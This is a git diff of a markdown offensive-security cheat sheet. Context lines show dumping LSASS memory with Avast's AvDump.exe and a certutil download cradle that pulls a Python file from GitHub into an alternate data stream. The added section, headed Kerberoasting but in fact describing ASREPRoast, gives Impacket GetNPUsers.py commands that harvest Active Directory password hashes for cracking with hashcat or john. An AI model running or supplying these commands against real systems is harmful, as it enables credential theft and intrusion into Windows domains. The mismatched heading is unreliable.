@@ -312,10 +312,24 @@ How to utilize Avast AV to dump LSASS (C:\Program Files\Avast Software\Avast)
 AvDump.exe --pid 1111 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
 ```
 
-## Certutil Download Cradle
+## Certutil Download Cradle:
 
 Download and save a Python file to an Alternate Data Stream (ADS).
 
 ```
 certutil.exe -urlcache -split -f https://github.com/RoseSecurity/APOLOGEE/blob/main/siemens_field_panel_scanner.py c:\temp:apologee.py
+```
+
+## Kerberoasting with Impacket:
+
+ASREPRoast
+
+With Impacket example GetNPUsers.py:
+
+```
+# check ASREPRoast for all domain users (credentials required)
+python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+
+# check ASREPRoast for a list of users (no credentials required)
+python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
